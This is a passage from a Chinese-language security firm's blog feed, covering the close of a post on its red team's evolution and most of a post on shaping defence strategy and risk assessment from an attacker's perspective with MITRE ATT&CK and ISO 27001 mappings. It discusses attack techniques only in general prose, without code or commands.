另一個例子是 &lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins 研究&lt;/a&gt;裡面的一環，我們在繞過身分認證之後發現有一個功能是在檢查使用者輸入的程式語法正不正確。伺服器怎樣去判斷語法正不正確？最簡單的方法就是直接去編譯看看，可以編譯成功就代表語法正確。所以我們研究了可以在『編譯階段』命令執行的方法，讓伺服器在嘗試判斷語法是否正確的同時執行我們的指令。這個手法過去沒有人提過，算是運用想像力的一個經典案例。&lt;/p&gt;

&lt;p&gt;關於想像力，其實還有一個隱藏的前提：基礎功要夠。我一直認為想像力是知識的排列組合，例如剛剛的兩個例子，如果不知道 Perl 語法特性和 Meta-Programming 的知識，再怎麼天馬行空都是不可能成功 RCE 的。有基礎功再加上勇於聯想和嘗試，絕對是一個紅隊大將的必備特質。至於基礎功需要到什麼程度，對我們來說，講到一個漏洞，心中就會同時跳出一個樹狀圖：出現成因是什麼？相關的案例、漏洞、繞過方式都會啵啵啵跳出來，能做到這樣我想就已經是有所小成了。&lt;/p&gt;

&lt;h3 id=&quot;追新技術&quot;&gt;追新技術&lt;/h3&gt;

&lt;p&gt;會追新技術這件事情，似乎是資安圈的標配，我們的世界不只有 OWASP TOP 10。更現實的說法是，如果只靠這麼一點知識，在紅隊演練能發揮的效果其實並不大。分享一下我看到成員們的樣子，對於他們來說，看新技術是每天的習慣，如果有資安研討會投影片釋出，會追。新技術裡有興趣的，會動手玩，甚至寫成工具，我們很多內部工具都是這樣默默補強的。還有一點，看新技術最終目的就是要活用，拿新技術解決舊問題，往往有機會發現一些突破方式。例如我們在今年八月 BlackHat 研討會看到了 &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync&lt;/a&gt; 的攻擊方式，回國之後馬上就把這個知識用在當時的專案上，讓我們多了一些攻擊面向！（這個手法挺有趣的，在我們污染伺服器後，隨機一個人瀏覽客戶網頁就會執行我們的 JavaScript，不需要什麼特殊條件，有興趣可以研究一下:p ）&lt;/p&gt;

&lt;h3 id=&quot;相信以及堅持&quot;&gt;相信…以及堅持&lt;/h3&gt;

&lt;p&gt;最後一點，我想分享的是：在研究或者測試的過程當中，有時候會花費很多時間卻沒有成果，但是如果你評估是有機會，那就相信自己，花時間做下去吧！&lt;br /&gt;
我們有一個花費一個月的例子，是之前&lt;a href=&quot;https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;破解 IDA Pro 偽隨機數&lt;/a&gt;的研究，這個事件意外在 binary 圈很有名，甚至還有人寫成&lt;a href=&quot;https://medium.com/the-singularity-is-near/recent-leak-of-ida-pro-7-2-a-brief-timeline-4c1dcbe6331e&quot;&gt;事件懶人包&lt;/a&gt;。這個研究是在探討如果我們沒有安裝密碼，有機會安裝 IDA PRO 嗎？結果最後我們想辦法逆推出了 IDA 密碼產生器的算法，知道偽隨機數使用了哪些字元，和它的正確排序。這件事情的難度已經不只在技術上，而在於要猜出偽隨機數使用的字元集順序，還要同時猜出對方使用的演算法（至少有88種）。而且我們每驗證一種排列組合，就會花半天時間和 100GB 的空間，累積成本滿高的。但我們根據經驗相信這是有機會成功的，並且投注資源堅持下去，最後有了很不錯的成果。&lt;/p&gt;

&lt;p&gt;這裡不是在鼓勵一意孤行，而是一種心理素質：是在面臨卡關的時候，有足夠的判斷力，方向錯誤能果斷放棄，如果方向正確要有堅持下去的勇氣。&lt;/p&gt;

&lt;h2 id=&quot;資安防護趨勢與紅隊的下一步&quot;&gt;資安防護趨勢與紅隊的下一步&lt;/h2&gt;

&lt;p&gt;文章的最後一部分要談的是紅隊演練的未來，也是這篇文章的重點，未來，我們希望可以解決什麼問題？&lt;/p&gt;

&lt;p&gt;做為紅隊演練的領導廠商，從 2017 年演練到現在我們進入台灣企業內網的成功率是 100%。我們在超過六成的演練案中拿到 AD 管理權限，這還不含那些不是用 AD 來管理的企業。我們發現進入內網後，通常不會有什麼阻礙，就好像變成內部員工，打了聲招呼就可以進機房。想要提醒大家的是：對頂尖攻擊團隊而言，進入企業內網的難度並不高。如果碰上頂尖的駭客，或是一個 0day，企業準備好了嗎？這就是現階段我們所發現的問題！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在說到抵禦攻擊通常會有三個面向，分別是「預防」、「偵測」和「回應」。一般而言企業在「預防」這部份做的比較完善，對於已知的弱點都有比較高的掌握度。今天普遍的問題在「&lt;strong&gt;偵測&lt;/strong&gt;」和「&lt;strong&gt;回應&lt;/strong&gt;」上，企業能不能發現有人在對你進行攻擊？或是知道被攻擊後有沒有能力即時回應並且根絕源頭？這兩件事情做得相對不好的原因並不是企業沒有投入資源在上面，而是對於企業來說太難驗證，很難有個標準去確定目前的機制有沒有效或是買了設備有沒有作用，就算有藍隊通常也沒有建立完善的應對 SOP，畢竟駭客入侵不會是天天發生的事情。&lt;/p&gt;

&lt;p&gt;所以，我們希望企業能從紅隊演練中，訓練對攻擊事件的偵測和反應能力。或是說，紅隊演練的本質就是在真實的演練，透過攻防幫助企業了解自己的弱項。過去台灣的紅隊服務都會強調在找出整個企業的弱點，找出漏洞固然重要，但碰到像我們一樣很常找到 0-day 的組織，有偵測和回應能力才是最後能救你一命的硬技能。換個角度來看，目前世界上最完整的攻擊戰略和技術手法列表是 &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK Framework&lt;/a&gt;，一個對企業有傷害的攻擊行動通常會是很多個攻擊手法所組成的攻擊鏈，而在這個 Framework 中，找到起始弱點這件事情僅佔了整個攻擊鏈不到一成，企業如果能夠投注在其他九成手法的偵測能力上並阻斷其中任一環節，就有機會讓整個攻擊行動失敗而保護到資產。&lt;/p&gt;

&lt;p&gt;要說的是，我們紅隊演練除了找出企業漏洞能力頂尖之外，也累積了很豐富的內網滲透經驗及技巧，我們很樂意透過演練協助企業加強真實的偵測和回應能力。漸漸的，未來紅隊會慢慢著重在和藍隊的攻防演練。會強調擬定戰略，讓企業了解自己對哪些攻擊的防禦能力比較弱，進而去改善。未來的紅隊也更需要強調與防禦機制交手的經驗，了解防禦的極限，才有辦法找到設備設定不全或是涵蓋率不足的盲點。&lt;/p&gt;

&lt;p&gt;最後我們也有些規劃建議給對資安防禦比較成熟的企業如下，逐步落實可以將資安體質提昇一個層次。（至少從我們的經驗來看，有這些概念的企業都是特別難攻擊達成目標的）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果外網安全已投資多年，開始思考「&lt;strong&gt;如果駭客已經在內網&lt;/strong&gt;」的防禦策略&lt;/li&gt;
  &lt;li&gt;盤點出最不可以被洩漏的重要資料，從這些地方開始奉行 &lt;strong&gt;Zero Trust&lt;/strong&gt; 概念&lt;/li&gt;
  &lt;li&gt;企業內部需要有專職資安人員編制（藍隊）&lt;/li&gt;
  &lt;li&gt;透過與有經驗的紅隊合作，全盤檢視防禦盲點&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;研討會內容到這邊就結束了。寫在最後的最後，是充滿著感謝。其實無論滲透測試還是紅隊演練，在一開始都不是人人可以接受的，而測試的價值也不是我們說了算。一路走來，漸漸漸漸感受到開始有人相信我們，從早期比較多測試時與工程師和網管人員的對立，到近期越來越多 open mind、就是想找出問題的客戶，是滿大的對比。非常感謝他們的信任，也因為這樣的互信，我們得以節省時間完成更棒的產出。滿樂見台灣資訊產業是這樣正向面對問題，漏洞存在就是存在，不會因為視而不見而真的不見，意識到有問題解決了就好。所以我在演講最後留下這樣一句：『&lt;strong&gt;紅隊演練的精髓不是在告訴你有多脆弱，在於真正壞人闖入時你可以獨當一面擋下&lt;/strong&gt;』，希望越來越多人能正面對待問題，同時也傳遞我們想要做到的價值。&lt;/p&gt;

&lt;p&gt;2019 DEVCORE CONF，謝謝過去合作的朋友們參與讓 DEVCORE 紅隊得以進化，希望下一步也能有你，我們明年見 :)&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next/</link>
                <guid>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next</guid>
                <pubDate>Thu, 24 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>以攻擊者的角度制定防禦策略</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇文章源自於公司今年第一次試辦的研討會 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt;，我們決定另外寫成 blog 分享出來，讓無法參加的朋友也可以從不同角度重新思考防禦策略。&lt;/p&gt;

&lt;p&gt;會想在純技術導向的研討會中加入策略面的議題，其實跟今年研討會的主軸「&lt;strong&gt;從策略擬定控制，從控制反映意識&lt;/strong&gt;」有關。如果企業缺乏長遠正確的資安策略，除了投入的資源無法達到企業預期的效益、一線資安人員疲於奔命外，管理階層在資訊不對稱的情況下認為投入的資源已經足夠安全，最終形成惡性循環，只能在每次資安事故後跟著時下流行選擇最夯資安的產品。&lt;/p&gt;

&lt;h2 id=&quot;理想中的防禦策略&quot;&gt;理想中的防禦策略&lt;/h2&gt;
&lt;p&gt;而最廣為人知的防禦策略可能是縱深防禦，以不同類型的控制措施 (設備、制度、服務) 減少敵人入侵的可能性、儘量減少單一控制措施失效造成的風險。然而，這個概念有幾個需要思考的重點&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;防護邊界遠大於企業的想像：導致無法掌握企業可能的入侵點。&lt;/li&gt;
  &lt;li&gt;對資安設備認知錯誤：這讓敵人可以繞過資安設備，或是設備沒有發揮企業預期的效用。&lt;/li&gt;
  &lt;li&gt;管理程序不夠落實：導致控制措施產生新的漏洞，譬如預設密碼沒有更改，導致 VPN 或網路設備可以直接被存取。&lt;/li&gt;
  &lt;li&gt;忽視重要資產相關性：只將防禦資源投注在重要資產本身，而輕忽與其相連的資產。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這一連串的疏忽，可能成為攻擊者入侵的路徑，就是所謂的瑞士起司模型 （Swiss Cheese Model)，因此企業期望透過風險評鑑 (Risk Assessment) 來盤點出可能的疏失，並且在權衡資源下，確保將重心放在高風險需要優先處理的項目。&lt;/p&gt;

&lt;p&gt;但我們想聊聊這個工具在實務上有它難以完善之處，以及從攻擊者的角度是怎樣看待這個擬訂防禦策略核心工具，我們會針對一下議題依序說明&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;真實風險其實複雜的難以評估&lt;/li&gt;
  &lt;li&gt;現行風險評鑑方式可能的偏差&lt;/li&gt;
  &lt;li&gt;從攻擊者的角度改善風險評鑑&lt;/li&gt;
  &lt;li&gt;挑選適合的方法改善風險評鑑&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;真實的風險其實複雜的難以評鑑&quot;&gt;真實的風險其實複雜的難以評鑑&lt;/h2&gt;
&lt;p&gt;在這裡我們引述 ITGovernance 對於風險評鑑的定義：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Risk Assessment – the process of identifying, analyzing and evaluating risk – is the only way to ensure that the cyber security controls you choose are appropriate to the risks your organization faces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;風險評鑑的精髓在於後半段的&lt;strong&gt;確保所選擇的控制措施是否適切於企業真正面臨的風險&lt;/strong&gt;，但多數的企業只完成前半段&lt;strong&gt;識別、分析及評估風險&lt;/strong&gt;，導致風險評鑑的成效無法完全發揮；而要達到風險評鑑的精髓，得先了解&lt;strong&gt;真實的風險&lt;/strong&gt;的組成的要素&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;真實風險 = { 威脅來源、意圖、威脅、弱點、機率、相依性、資產價值、控制措施 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;威脅來源(Threat Agent)：造成威脅或使用弱點的來源個體，例如：組織型犯罪、駭客組織、國家資助犯罪、競爭對手、駭客、內部員工或天災等。&lt;/li&gt;
  &lt;li&gt;意圖(Intent)：威脅來源的想達到的目的，例如：取得個人資料、盜取商業機密、破壞企業/個人形象、造成財物損失等。&lt;/li&gt;
  &lt;li&gt;威脅(Threat)：達成意圖的方式，例如：惡意程式、社交工程、DDoS、利用系統漏洞等。&lt;/li&gt;
  &lt;li&gt;弱點(Vulnerability)：指資產能被威脅利用的弱點，例如：漏洞未更新、人員疏忽、組態設定不當、網路區隔配置錯誤等。&lt;/li&gt;
  &lt;li&gt;機率(Probability)：指弱點的易用度或可能發生的機率，例如：CVSS 3.0分數、過去對於某個弱點發生頻率的統計等。&lt;/li&gt;
  &lt;li&gt;相依性(Correlation)：資產彼此間的關聯，例如：網路拓樸、虛擬化的關係、集中派版系統、防毒中控主機等。&lt;/li&gt;
  &lt;li&gt;資產價值(Value)：企業認定該資產在 C、I、A 及法律衝擊下，所具有的價值，例如：核心系統及資料、一般操作資料、實體設備等。&lt;/li&gt;
  &lt;li&gt;控制措施(Countermeasure)：用來降低企業面臨風險的措施，例如：資安設備、管理制度、教育訓練等。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而，多數企業在評估企業風險時，為求方便，會將風險評鑑的參數簡化成 {&lt;strong&gt;弱點、機率、資產價值&lt;/strong&gt;}，忽略了與敵人相關的參數 {威脅來源、意圖、威脅、戰略價值}；接下來的兩個例子將說明忽略後造成風險評鑑的偏差，包含了&lt;strong&gt;資產價值的輕忽&lt;/strong&gt;及&lt;strong&gt;輕忽漏洞利用的可能性&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;現實風險評鑑可能的偏差&quot;&gt;現實風險評鑑可能的偏差&lt;/h2&gt;
&lt;h3 id=&quot;敵人在意的是戰略價值而不僅是資產價值&quot;&gt;敵人在意的是戰略價值而不僅是資產價值&lt;/h3&gt;

&lt;p&gt;透過風險評鑑可以識別出資產可能面臨的風險，並且作為預算或資源投入優先順序的參考，一般可以分為 3 個優先等級：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;優先處理「高衝擊、高機率」 (項次 1、項次 2) 的風險：通常是超出企業可接受風險的威脅，藉由控制措施將風險下降到可接受的程度，這部分通常是企業資源優先或持續投入的重點。&lt;/li&gt;
  &lt;li&gt;次之是「高衝擊、低機率 」(項次 3、項次 4)的風險：此等級是屬於需要持續關注避免升高的風險，如果企業預算仍有餘裕，應該投入的第二個等級。&lt;/li&gt;
  &lt;li&gt;最後是「低衝擊、低機率 」(項次 5、項次 6)的風險：看起來對企業不會有立即危害，一般不需特別關注或投入資源。&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項次&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;資產名稱&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;價值&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;威脅&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;弱點&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;衝擊&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;機率&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;風險&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;交易資料&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;蓄意破壞&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;建築物管制不足&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;用戶個資&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;勒贖軟體加密&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;轉帳系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;軟體失效&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;遭到 DDoS 攻擊&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;18&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;核心系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;軟體失效&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;維護服務時間過長&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;版本更新系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;未經授權存取&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;橫向移動&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;內部差勤系統&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;系統入侵&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;無法上 patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;然而，對敵人而言，選擇欲攻下的灘頭堡時，看重的是&lt;strong&gt;資產的戰略價值&lt;/strong&gt;，而與資產本身的價值沒有必然的關係，如上表項次 6 的內部差勤系統如果是能串接到敵人主要的標的，對他來說就是一個必定會設法取得控制權的資產，而這時可以發現經由簡化版的風險評鑑並不容易呈現這個資產所面臨的風險。&lt;/p&gt;

&lt;h3 id=&quot;低估弱點可利用機率&quot;&gt;低估弱點可利用機率&lt;/h3&gt;
&lt;p&gt;防守方在使用分險評鑑時，另一個問題是無法準確的估計弱點的可利用機率，雖然市面上已經有許多弱點管理軟體可以協助，但面對真實攻擊時，敵人不會只利用已知的漏洞或是 OWASP TOP10，甚至自行研發 0-day。因此，當企業已經進行一定程度的防護措施後，如果不曾經歷資安事故或缺乏正確的認知，往往認為應該不會有這麼厲害的駭客可以突破既有的防護措施，但從歷來的資安事故及我們服務的經驗告訴我們，其實電影裡面演的都是真的！！&lt;/p&gt;

&lt;h2 id=&quot;從攻擊者的角度改善風險評鑑&quot;&gt;從攻擊者的角度改善風險評鑑&lt;/h2&gt;
&lt;p&gt;很多人以為攻擊者的角度指的是漏洞挖掘，其實並不全然。攻擊者對於想竊取的資產，也是經過縝密的規劃及反～覆～觀～察～，他們一樣有策略、技法跟工具。而 &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK&lt;/a&gt; 就是一個對於已知攻擊策略及技巧具備完整定義及收集的框架，它可以用來協助建立威脅情資 (Threat Intelligence)、改善防守方的偵測及分析、強化模擬敵人及紅隊演練等，相關的使用方式都在其官網上可以找到，細節我們不在這邊介紹。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們可以將已經發生的資安事故 (Incident) 或紅隊演練對應到 ATT&amp;amp;CK Enterprise Framework 中，並且評估目前所建置的控制措施是否可以減緩、阻擋或偵測這些技巧。以下圖為例，淺綠色方塊是紅隊演練所採用的技巧、紅色方塊則是資安事故使用的技巧，企業可以同時比對多個資安事故或是紅隊演練的結果，找出交集的淺黃色區塊，即是企業可以優先強化的控制措施或是預算應該投入之處。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191009/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊有個需要特別注意的地方，ATT&amp;amp;CK Enterprise Framework 作為一個驗證防守方控制措施的有效性是一個非常好的框架，然而不建議利用這個框架的特定技巧作為限制紅隊演練的情境，要記得「當使用 ATT&amp;amp;CK 時要注意有其偏差，這可能會將已知的攻擊行為優先於未知的攻擊行為」，正如同紅隊演練的精神，是透過無所不用其極的方式找到可以成功的入侵方式，因此我們會建議給予紅隊演練團隊最自由的發揮空間，才能真正找出企業可能的盲點。&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Remember any ATT&amp;amp;CK-mapped data has biases:You’re prioritizing known adversary behavior over the unknown.&lt;br /&gt;
－ Katie Nickels, Threat Intelligence Lead @ The MITRE Corporation&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;挑選適合的方法改善防禦策略&quot;&gt;挑選適合的方法改善防禦策略&lt;/h2&gt;
&lt;p&gt;那麼在我們了解敵人會使用的策略、技巧之後，企業要如何挑選改善防禦策略的方法？理想上，我們建議如果預算許可，&lt;a href=&quot;https://devco.re/services/red-team#service-content-3&quot;&gt;這類型&lt;/a&gt;的企業至少應該執行一次高強度的紅隊演練，來全面性的盤點企業面臨的威脅，但現實上並非每個企業都有足夠的預算。因此，在不同的條件下，可以使用不同的方法來改善防禦策略，我們建議可以從以下幾個因素進行評估：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;時間：執行這個方法所需要的時間。&lt;/li&gt;
  &lt;li&gt;成本：利用這個方法需要付出的成本 (包含金錢、名聲)。&lt;/li&gt;
  &lt;li&gt;真實性：所採用的方法是否能真實反映現實的威脅。&lt;/li&gt;
  &lt;li&gt;範圍：所採用的方法能涵蓋範圍是否足以代表企業整體狀況。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這邊我們以風險評鑑、弱點掃描、滲透測試、模擬攻擊、紅隊演練及資安事件作為改善防禦策略的方法，而分別就上述六個項目給予相對的分數，並且依照&lt;strong&gt;真實性、範圍、成本及時間作為排序的優先序&lt;/strong&gt;(順序依企業的狀況有所不同）。而我們會這樣排序的原因是：一個好的方法應該要&lt;strong&gt;與真實世界的攻擊相仿&lt;/strong&gt;而且在整個過程上&lt;strong&gt;足以發現企業整體資安的狀況&lt;/strong&gt;，最後才是考慮所花費的成本及時間。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;方法&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;真實性&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;範圍&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;成本&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;時間&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;資安事件&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;紅隊演練&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;模擬攻擊&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;滲透測試&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;弱點掃描&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;風險評鑑&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;到這裡，除了資安事件外，大致可以決定要用來協助評估防禦策略所應該選擇的方法。更重要的是在使用這些方法後，要將結果反饋回風險評鑑中，因為相較於其他方法風險評鑑是一個最簡單且廣泛的方法，這有助於企業持續將資源投注在重大的風險上。&lt;/p&gt;

&lt;h2 id=&quot;案例&quot;&gt;案例&lt;/h2&gt;
&lt;p&gt;最後，我們以一個紅隊演練案例中所發現控制措施的疏漏，來改善企業的風險評鑑方式。同時，我們將入侵的成果對應至 ISO27001:2013 的本文要求及控制項目，這些項目可以視為以攻擊者的角度稽核企業的管理制度，更能反映制度的落實情形。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項目&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;發現&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;本文/附錄&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;核心系統盤點未完整&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;本文 4.3 決定 ISMS 範圍&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;監控範圍不足&lt;/td&gt;
